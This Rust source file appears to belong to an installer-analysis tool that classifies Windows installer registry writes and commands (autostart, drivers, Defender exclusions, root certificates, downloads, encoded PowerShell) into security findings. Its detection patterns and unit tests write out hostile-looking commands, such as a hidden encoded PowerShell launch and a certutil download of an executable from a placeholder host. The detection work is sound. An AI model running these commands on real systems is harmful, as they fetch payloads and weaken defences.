//! What an installer does to a system, in one model shared by NSIS, Inno Setup and MSI.
//!
//! Each format's reader fills an [`Installer`]; [`report`] turns it into a fact and findings.
//! Every item carries `source`: where in the installer it was read (a script entry number, a
//! table row), which becomes the location of the evidence.

use aa_core::plugin::Output;
use aa_core::{Artifact, Confidence, Evidence, Finding, Section, Severity};
use serde_json::{Value, json};

use crate::ID;

/// Items kept per list; installers with more set `truncated`.
pub const MAX_ITEMS: usize = 5000;
/// Evidence entries attached to one finding.
const MAX_EVIDENCE: usize = 12;

#[derive(Debug, Clone, Default)]
pub struct RegistryWrite {
    /// `HKLM`, `HKCU`, `HKCR`, `HKU`, or the format's own word for "depends on install scope".
    pub root: String,
    pub key: String,
    pub name: String,
    pub value: Option<String>,
    pub source: String,
}

#[derive(Debug, Clone, Default)]
pub struct Command {
    pub command: String,
    pub source: String,
}

#[derive(Debug, Clone, Default)]
pub struct Shortcut {
    pub path: String,
    pub target: String,
    pub arguments: String,
    pub source: String,
}

#[derive(Debug, Clone, Default)]
pub struct Service {
    pub name: String,
    pub display_name: Option<String>,
    /// `auto`, `demand`, `boot`, `system`, `disabled`, when known.
    pub start: Option<String>,
    /// True for kernel and file-system drivers.
    pub driver: bool,
    pub account: Option<String>,
    pub command: Option<String>,
    pub source: String,
}

#[derive(Debug, Clone, Default)]
pub struct Installer {
    /// `NSIS`, `Inno Setup` or `MSI`.
    pub kind: &'static str,
    /// Version and compression of the installer format, for the reader.
    pub format: Option<String>,
    pub product: Option<String>,
    pub version: Option<String>,
    pub publisher: Option<String>,
    pub install_dir: Option<String>,
    /// Whether the installer asks for administrator rights, and where that was read.
    pub admin: Option<(bool, String)>,
    pub files: Option<u64>,
    pub files_bytes: Option<u64>,
    pub registry: Vec<RegistryWrite>,
    pub commands: Vec<Command>,
    pub shortcuts: Vec<Shortcut>,
    pub services: Vec<Service>,
    /// `(name, value, source)` of environment variables set.
    pub environment: Vec<(String, String, String)>,
    /// `(what, source)`: downloads the format expresses directly (plug-in calls, download entries).
    pub downloads: Vec<(String, String)>,
    /// Format-specific details that go into the fact as they are.
    pub extra: serde_json::Map<String, Value>,
    pub truncated: bool,
    /// True for the uninstaller an installer leaves behind: its actions undo an installation.
    pub uninstaller: bool,
}

/// What a registry write or a command means for the system.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Tag {
    Autostart,
    Service,
    Driver,
    ScheduledTask,
    Firewall,
    FileAssociation,
    ProtocolHandler,
    ShellExtension,
    UninstallEntry,
    Environment,
    SecuritySetting,
    RootCertificate,
    Download,
    EncodedCommand,
}

impl Tag {
    fn rule(self) -> &'static str {
        match self {
            Tag::Autostart => "windows.installer-autostart",
            Tag::Service => "windows.installer-service",
            Tag::Driver => "windows.installer-driver",
            Tag::ScheduledTask => "windows.installer-scheduled-task",
            Tag::Firewall => "windows.installer-firewall",
            Tag::FileAssociation => "windows.installer-file-association",
            Tag::ProtocolHandler => "windows.installer-protocol-handler",
            Tag::ShellExtension => "windows.installer-shell-extension",
            Tag::UninstallEntry => "windows.installer-uninstall-entry",
            Tag::Environment => "windows.installer-environment",
            Tag::SecuritySetting => "windows.installer-security-setting",
            Tag::RootCertificate => "windows.installer-root-certificate",
            Tag::Download => "windows.installer-download",
            Tag::EncodedCommand => "windows.installer-encoded-command",
        }
    }

    fn name(self) -> &'static str {
        match self {
            Tag::Autostart => "autostart",
            Tag::Service => "service",
            Tag::Driver => "driver",
            Tag::ScheduledTask => "scheduled_task",
            Tag::Firewall => "firewall",
            Tag::FileAssociation => "file_association",
            Tag::ProtocolHandler => "protocol_handler",
            Tag::ShellExtension => "shell_extension",
            Tag::UninstallEntry => "uninstall_entry",
            Tag::Environment => "environment",
            Tag::SecuritySetting => "security_setting",
            Tag::RootCertificate => "root_certificate",
            Tag::Download => "download",
            Tag::EncodedCommand => "encoded_command",
        }
    }

    fn section(self) -> Section {
        match self {
            Tag::EncodedCommand => Section::Anomalies,
            Tag::Download => Section::Network,
            _ => Section::Capabilities,
        }
    }

    fn severity(self) -> Severity {
        match self {
            Tag::Autostart | Tag::Service | Tag::ScheduledTask | Tag::Firewall | Tag::Download => Severity::Low,
            Tag::Driver | Tag::SecuritySetting | Tag::RootCertificate | Tag::EncodedCommand => Severity::Medium,
            _ => Severity::Info,
        }
    }

    const ALL: [Tag; 14] = [
        Tag::Autostart,
        Tag::Service,
        Tag::Driver,
        Tag::ScheduledTask,
        Tag::Firewall,
        Tag::FileAssociation,
        Tag::ProtocolHandler,
        Tag::ShellExtension,
        Tag::UninstallEntry,
        Tag::Environment,
        Tag::SecuritySetting,
        Tag::RootCertificate,
        Tag::Download,
        Tag::EncodedCommand,
    ];
}

/// Classifies a registry write by its key and value name.
pub fn classify_registry(write: &RegistryWrite) -> Vec<Tag> {
    let root = write.root.to_ascii_uppercase();
    let key = write.key.trim_matches('\\').to_ascii_lowercase();
    let name = write.name.to_ascii_lowercase();
    // HKCR is a view of Software\Classes.
    let class_key =
        if root == "HKCR" || root == "HKEY_CLASSES_ROOT" { Some(key.as_str()) } else { key.strip_prefix("software\\classes\\") };
    let mut tags = Vec::new();
    let autostart = key.contains("\\currentversion\\run")
        && key.rsplit('\\').next().is_some_and(|last| matches!(last, "run" | "runonce" | "runonceex" | "runservices" | "runservicesonce"))
        || key.contains("\\currentversion\\policies\\explorer\\run")
        || key.ends_with("\\windows nt\\currentversion\\winlogon") && matches!(name.as_str(), "shell" | "userinit" | "taskman")
        || key.contains("\\active setup\\installed components\\") && name == "stubpath"
        || key.contains("\\image file execution options\\") && name == "debugger"
        || key.ends_with("\\windows nt\\currentversion\\windows") && matches!(name.as_str(), "appinit_dlls" | "load" | "run")
        || key.contains("\\currentversion\\explorer\\shellserviceobjectdelayload");
    if autostart {
        tags.push(Tag::Autostart);
    }
    if key.starts_with("system\\currentcontrolset\\services\\") || key.contains("\\controlset001\\services\\") {
        // Type 1 is a kernel driver, 2 a file-system driver.
        let driver = name == "type"
            && write.value.as_deref().is_some_and(|v| matches!(v.trim(), "1" | "2" | "0x1" | "0x2" | "0x00000001" | "0x00000002"));
        tags.push(if driver { Tag::Driver } else { Tag::Service });
    }
    if key.contains("\\currentversion\\uninstall\\") {
        tags.push(Tag::UninstallEntry);
    }
    if let Some(class) = class_key {
        let first = class.split('\\').next().unwrap_or_default();
        if first.starts_with('.') && first.len() > 1 {
            tags.push(Tag::FileAssociation);
        }
        if name == "url protocol" {
            tags.push(Tag::ProtocolHandler);
        }
    }
    if key.contains("\\shellex\\") || key.contains("shell extensions\\approved") || key.contains("explorer\\browser helper objects") {
        tags.push(Tag::ShellExtension);
    }
    if key.ends_with("control\\session manager\\environment") || key == "environment" {
        tags.push(Tag::Environment);
    }
    if key.contains("\\firewallpolicy\\") {
        tags.push(Tag::Firewall);
    }
    if key.contains("\\windows defender\\exclusions")
        || key.contains("\\windows defender") && name.starts_with("disable")
        || key.ends_with("\\currentversion\\policies\\system")
            && matches!(name.as_str(), "enablelua" | "consentpromptbehavioradmin" | "promptonsecuredesktop")
    {
        tags.push(Tag::SecuritySetting);
    }
    if key.contains("\\systemcertificates\\root\\certificates") || key.contains("\\systemcertificates\\authroot\\certificates") {
        tags.push(Tag::RootCertificate);
    }
    tags
}

/// Classifies a command line an installer runs.
pub fn classify_command(command: &str) -> Vec<Tag> {
    let c = command.to_ascii_lowercase();
    let has = |needle: &str| c.contains(needle);
    // The program name as a word: `sc`, `sc.exe`, `"...\sc.exe"`.
    let runs = |program: &str| {
        c.split(|ch: char| ch.is_whitespace() || matches!(ch, '"' | '\'' | '\\' | '/' | '&' | '|' | ';' | '('))
            .any(|word| word == program || word.strip_suffix(".exe") == Some(program))
    };
    let mut tags = Vec::new();
    let kernel_type = has("type= kernel") || has("type=kernel") || has("type= filesys") || has("type=filesys");
    if runs("sc") && (has(" create ") || has(" config ")) || has("new-service") || runs("installutil") {
        tags.push(if kernel_type { Tag::Driver } else { Tag::Service });
    }
    if runs("pnputil") || runs("dpinst") || runs("devcon") || has("installhinfsection") || runs("drvinst") {
        tags.push(Tag::Driver);
    }
    if runs("schtasks") && has("/create") || has("register-scheduledtask") {
        tags.push(Tag::ScheduledTask);
    }
    if runs("netsh") && has("firewall") || has("new-netfirewallrule") {
        tags.push(Tag::Firewall);
    }
    if has("add-mppreference") || has("set-mppreference") {
        tags.push(Tag::SecuritySetting);
    }
    if runs("certutil") && has("-addstore") || has("import-certificate") || runs("certmgr") && has("-add") {
        tags.push(Tag::RootCertificate);
    }
    // A URL alone only opens a web page; it is a download when a tool that fetches is involved.
    let url = has("http://") || has("https://") || has("ftp://");
    let fetcher = ["powershell", "pwsh", "curl", "wget", "bitsadmin", "certutil", "msiexec", "mshta", "cscript", "wscript"]
        .iter()
        .any(|tool| runs(tool));
    if url && fetcher
        || has("invoke-webrequest")
        || has("downloadfile")
        || has("downloadstring")
        || has("start-bitstransfer")
        || runs("certutil") && has("urlcache")
        || runs("bitsadmin") && has("/transfer")
    {
        tags.push(Tag::Download);
    }
    if (runs("powershell") || runs("pwsh")) && (has(" -enc ") || has(" -encodedcommand ") || has(" -e ") || has(" -ec ")) {
        tags.push(Tag::EncodedCommand);
    }
    tags
}

fn truncate(text: &str, max: usize) -> String {
    if text.chars().count() <= max {
        return text.to_string();
    }
    let cut: String = text.chars().take(max).collect();
    format!("{cut}…")
}

/// Emits the `windows.installer` fact and the findings that follow from `installer`.
pub fn report(file: &Artifact, installer: &Installer, out: &mut Output) {
    // tag -> evidence (source, value)
    let mut tagged: std::collections::BTreeMap<Tag, Vec<(String, Value)>> = std::collections::BTreeMap::new();
    let mut registry_json = Vec::new();
    for write in &installer.registry {
        let tags = classify_registry(write);
        let value = json!({
            "root": write.root,
            "key": write.key,
            "name": write.name,
            "value": write.value.as_deref().map(|v| truncate(v, 400)),
        });
        for tag in &tags {
            tagged.entry(*tag).or_default().push((write.source.clone(), value.clone()));
        }
        let mut entry = value;
        entry["source"] = json!(write.source);
        entry["tags"] = json!(tags.iter().map(|t| t.name()).collect::<Vec<_>>());
        registry_json.push(entry);
    }
    let mut commands_json = Vec::new();
    for command in &installer.commands {
        let tags = classify_command(&command.command);
        let value = json!({ "command": truncate(&command.command, 600) });
        for tag in &tags {
            tagged.entry(*tag).or_default().push((command.source.clone(), value.clone()));
        }
        commands_json.push(json!({
            "command": truncate(&command.command, 600),
            "source": command.source,
            "tags": tags.iter().map(|t| t.name()).collect::<Vec<_>>(),
        }));
    }
    for shortcut in &installer.shortcuts {
        let path = shortcut.path.to_ascii_lowercase();
        if path.contains("$smstartup")
            || path.contains("{userstartup}")
            || path.contains("{commonstartup}")
            || path.contains("startupfolder")
            || path.contains("\\startup\\")
        {
            let value = json!({ "shortcut": shortcut.path, "target": shortcut.target, "arguments": shortcut.arguments });
            tagged.entry(Tag::Autostart).or_default().push((shortcut.source.clone(), value));
        }
    }
    for service in &installer.services {
        let value = json!({
            "service": service.name,
            "display_name": service.display_name,
            "start": service.start,
            "account": service.account,
            "command": service.command,
        });
        tagged.entry(if service.driver { Tag::Driver } else { Tag::Service }).or_default().push((service.source.clone(), value));
    }
    for (name, value, source) in &installer.environment {
        tagged.entry(Tag::Environment).or_default().push((source.clone(), json!({ "variable": name, "value": truncate(value, 200) })));
    }
    for (what, source) in &installer.downloads {
        tagged.entry(Tag::Download).or_default().push((source.clone(), json!({ "download": what })));
    }

    let mut fact = json!({
        "kind": installer.kind,
        "uninstaller": installer.uninstaller,
        "format": installer.format,
        "product": installer.product,
        "version": installer.version,
        "publisher": installer.publisher,
        "install_dir": installer.install_dir,
        "requires_admin": installer.admin.as_ref().map(|(required, source)| json!({ "required": required, "source": source })),
        "files": installer.files,
        "files_bytes": installer.files_bytes,
        "registry_writes": registry_json,
        "commands": commands_json,
        "shortcuts": installer.shortcuts.iter().map(|s| json!({ "path": s.path, "target": s.target, "arguments": s.arguments, "source": s.source })).collect::<Vec<_>>(),
        "services": installer.services.iter().map(|s| json!({
            "name": s.name, "display_name": s.display_name, "start": s.start, "driver": s.driver, "account": s.account,
            "command": s.command, "source": s.source,
        })).collect::<Vec<_>>(),
        "environment": installer.environment.iter().map(|(n, v, s)| json!({ "name": n, "value": v, "source": s })).collect::<Vec<_>>(),
        "downloads": installer.downloads.iter().map(|(w, s)| json!({ "what": w, "source": s })).collect::<Vec<_>>(),
        "truncated": installer.truncated,
    });
    if let Some(object) = fact.as_object_mut() {
        for (key, value) in &installer.extra {
            object.insert(key.clone(), value.clone());
        }
    }
    out.fact(file, "windows.installer", fact);

    let finding = |section, rule: &str, confidence, severity| Finding::new(section, ID, rule, confidence, severity);
    let field = |source: &str, value: Value| Evidence::field(file, source, value);

    // Identity: only what the installer actually states.
    let mut identity = Vec::new();
    for (label, value) in [
        ("Product", &installer.product),
        ("Version", &installer.version),
        ("Publisher", &installer.publisher),
        ("InstallDir", &installer.install_dir),
        ("Format", &installer.format),
    ] {
        if let Some(value) = value.as_deref().filter(|v| !v.is_empty()) {
            identity.push(format!("{label}={value}"));
        }
    }
    let identity_rule = if installer.uninstaller { "windows.uninstaller" } else { "windows.installer" };
    out.finding(
        finding(Section::Identity, identity_rule, Confidence::Verified, Severity::Info)
            .param("kind", installer.kind)
            .param("details", if identity.is_empty() { "—".to_string() } else { identity.join("; ") })
            .evidence(field(
                "installer header",
                json!({ "product": installer.product, "version": installer.version, "publisher": installer.publisher, "install_dir": installer.install_dir }),
            )),
    );
    // What an uninstaller does is the removal of an installation; its actions are kept in the
    // fact and not reported as things that get installed.
    if installer.uninstaller {
        return;
    }
    if let Some(files) = installer.files {
        out.finding(
            finding(Section::Structure, "windows.installer-files", Confidence::Verified, Severity::Info)
                .param("files", files)
                .param("bytes", installer.files_bytes.map(Value::from).unwrap_or(json!("?")))
                .param("registry", installer.registry.len())
                .param("shortcuts", installer.shortcuts.len())
                .evidence(field("installer file list", json!({ "files": files, "bytes": installer.files_bytes }))),
        );
    }
    if let Some((true, source)) = &installer.admin {
        out.finding(
            finding(Section::Capabilities, "windows.installer-admin", Confidence::Verified, Severity::Info)
                .evidence(field(source, json!(true))),
        );
    }
    if !installer.commands.is_empty() {
        let mut f = finding(Section::Capabilities, "windows.installer-runs", Confidence::Verified, Severity::Info)
            .param("count", installer.commands.len());
        for command in installer.commands.iter().take(MAX_EVIDENCE) {
            f = f.evidence(field(&command.source, json!(truncate(&command.command, 300))));
        }
        out.finding(f);
    }
    for tag in Tag::ALL {
        let Some(items) = tagged.get(&tag) else { continue };
        // What a command means is read from its text, so those findings are pattern matches;
        // registry keys, service tables and shortcuts are read from defined structures.
        let from_commands = items.iter().all(|(_, value)| value.get("command").is_some());
        let confidence = if from_commands { Confidence::Heuristic } else { Confidence::Derived };
        let mut f = finding(tag.section(), tag.rule(), confidence, tag.severity()).param("count", items.len());
        for (source, value) in items.iter().take(MAX_EVIDENCE) {
            f = f.evidence(field(source, value.clone()));
        }
        out.finding(f);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write(root: &str, key: &str, name: &str, value: &str) -> RegistryWrite {
        RegistryWrite { root: root.into(), key: key.into(), name: name.into(), value: Some(value.into()), source: "test".into() }
    }

    #[test]
    fn registry_keys_are_classified() {
        let run = write("HKLM", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "App", "x");
        assert_eq!(classify_registry(&run), [Tag::Autostart]);
        let run_once = write("HKCU", "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "App", "x");
        assert_eq!(classify_registry(&run_once), [Tag::Autostart]);
        // "Run" as part of a longer name is not an autostart key.
        assert!(classify_registry(&write("HKLM", "Software\\Vendor\\CurrentVersion\\Runtime", "x", "y")).is_empty());
        assert_eq!(classify_registry(&write("HKLM", "SYSTEM\\CurrentControlSet\\Services\\Foo", "ImagePath", "x")), [Tag::Service]);
        assert_eq!(classify_registry(&write("HKLM", "SYSTEM\\CurrentControlSet\\Services\\Foo", "Type", "1")), [Tag::Driver]);
        assert_eq!(classify_registry(&write("HKCR", ".foo", "", "Foo.Doc")), [Tag::FileAssociation]);
        assert_eq!(classify_registry(&write("HKCU", "Software\\Classes\\foo", "URL Protocol", "")), [Tag::ProtocolHandler]);
        assert_eq!(
            classify_registry(&write("HKLM", "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Foo", "DisplayName", "Foo")),
            [Tag::UninstallEntry]
        );
        assert_eq!(classify_registry(&write("HKCR", "*\\shellex\\ContextMenuHandlers\\Foo", "", "{guid}")), [Tag::ShellExtension]);
        assert_eq!(
            classify_registry(&write("HKLM", "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", "C:\\x", "0")),
            [Tag::SecuritySetting]
        );
        assert!(classify_registry(&write("HKLM", "Software\\Vendor\\App", "Installed", "1")).is_empty());
    }

    #[test]
    fn commands_are_classified() {
        assert_eq!(classify_command("sc.exe create Svc binPath= \"C:\\x.exe\" start= auto"), [Tag::Service]);
        assert_eq!(classify_command("\"C:\\Windows\\System32\\sc.exe\" create Drv type= kernel binPath= x.sys"), [Tag::Driver]);
        assert_eq!(classify_command("schtasks /Create /TN t /TR x"), [Tag::ScheduledTask]);
        assert_eq!(classify_command("netsh advfirewall firewall add rule name=x"), [Tag::Firewall]);
        assert_eq!(classify_command("powershell -Command Add-MpPreference -ExclusionPath C:\\x"), [Tag::SecuritySetting]);
        assert_eq!(classify_command("powershell -nop -w hidden -enc SQBFAFgA"), [Tag::EncodedCommand]);
        assert_eq!(classify_command("certutil -urlcache -f http://example.invalid/a.exe a.exe"), [Tag::Download]);
        assert!(classify_command("\"$INSTDIR\\app.exe\" --first-run").is_empty());
        // "sc" inside another word is not the service tool.
        assert!(classify_command("misc.exe create thing").is_empty());
    }
}
